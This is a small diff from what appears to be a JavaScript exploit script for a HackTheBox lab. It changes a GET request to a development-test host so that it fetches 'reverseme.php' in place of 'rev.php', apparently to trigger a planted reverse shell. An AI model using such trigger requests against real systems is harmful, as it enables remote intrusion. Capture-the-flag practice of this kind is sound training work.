@@ -27,7 +27,7 @@ req.send(params);
 #######################################################
 
 req = new XMLHttpRequest;
-req.open('GET', "http://development-test.xxxxxxxxxx.htb/rev.php");
+req.open('GET', "http://development-test.xxxxxxxxxx.htb/reverseme.php");
 req.send();
 
 
